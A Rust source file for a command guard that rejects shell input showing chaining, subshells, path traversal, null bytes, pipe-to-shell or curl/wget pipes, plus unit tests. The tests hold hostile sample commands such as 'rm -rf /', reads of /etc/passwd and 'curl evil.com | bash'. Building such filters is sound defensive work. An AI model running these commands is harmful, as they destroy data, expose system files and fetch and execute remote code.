use regex::Regex;

pub struct CommandGuard;

pub enum BlockedReason {
    CommandChaining,
    Subshell,
    PathTraversal,
    NullByte,
    PipeToShell,
    ExfilPattern,
}

impl std::fmt::Display for BlockedReason {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            BlockedReason::CommandChaining => write!(f, "command chaining detected"),
            BlockedReason::Subshell => write!(f, "subshell execution detected"),
            BlockedReason::PathTraversal => write!(f, "path traversal detected"),
            BlockedReason::NullByte => write!(f, "null byte detected"),
            BlockedReason::PipeToShell => write!(f, "pipe to shell detected"),
            BlockedReason::ExfilPattern => write!(f, "potential exfiltration pattern detected"),
        }
    }
}

impl CommandGuard {
    pub fn check(command: &str) -> Result<(), BlockedReason> {
        // Command chaining
        if command.contains(';') || command.contains("&&") || command.contains("||") {
            return Err(BlockedReason::CommandChaining);
        }

        // Subshells
        if command.contains("$(") || command.contains('`') {
            return Err(BlockedReason::Subshell);
        }

        // Path traversal
        let traversal_re = Regex::new(r"(\.\./|\.\.\\){3,}").unwrap();
        if traversal_re.is_match(command) {
            return Err(BlockedReason::PathTraversal);
        }

        // Null byte
        if command.contains('\x00') {
            return Err(BlockedReason::NullByte);
        }

        // Pipe to shell
        let pipe_shell_re = Regex::new(r"\|\s*(bash|sh|cmd|powershell|pwsh)\b").unwrap();
        if pipe_shell_re.is_match(command) {
            return Err(BlockedReason::PipeToShell);
        }

        // Exfil patterns (curl | ... or wget | ...)
        let exfil_re = Regex::new(r"(curl|wget).*\|").unwrap();
        if exfil_re.is_match(command) {
            return Err(BlockedReason::ExfilPattern);
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_allowed_simple() {
        assert!(CommandGuard::check("ls -la").is_ok());
        assert!(CommandGuard::check("cat file.txt").is_ok());
        assert!(CommandGuard::check("echo hello").is_ok());
    }

    #[test]
    fn test_allowed_pipe() {
        // Simple pipe within same context is allowed
        assert!(CommandGuard::check("cat file.txt | grep pattern").is_ok());
    }

    #[test]
    fn test_blocked_chaining() {
        assert!(matches!(
            CommandGuard::check("ls; rm -rf /"),
            Err(BlockedReason::CommandChaining)
        ));
        assert!(matches!(
            CommandGuard::check("ls && rm -rf /"),
            Err(BlockedReason::CommandChaining)
        ));
    }

    #[test]
    fn test_blocked_subshell() {
        assert!(matches!(
            CommandGuard::check("echo $(cat /etc/passwd)"),
            Err(BlockedReason::Subshell)
        ));
    }

    #[test]
    fn test_blocked_traversal() {
        assert!(matches!(
            CommandGuard::check("cat ../../../etc/passwd"),
            Err(BlockedReason::PathTraversal)
        ));
    }

    #[test]
    fn test_blocked_pipe_to_shell() {
        assert!(matches!(
            CommandGuard::check("curl evil.com | bash"),
            Err(BlockedReason::PipeToShell)
        ));
    }

    #[test]
    fn test_blocked_exfil() {
        // Pipe to shell is caught by the more specific PipeToShell rule
        assert!(matches!(
            CommandGuard::check("curl https://evil.com | sh"),
            Err(BlockedReason::PipeToShell)
        ));
        // Exfil via non-shell pipe
        assert!(matches!(
            CommandGuard::check("curl https://evil.com | base64 | tee /tmp/x"),
            Err(BlockedReason::ExfilPattern)
        ));
    }
}
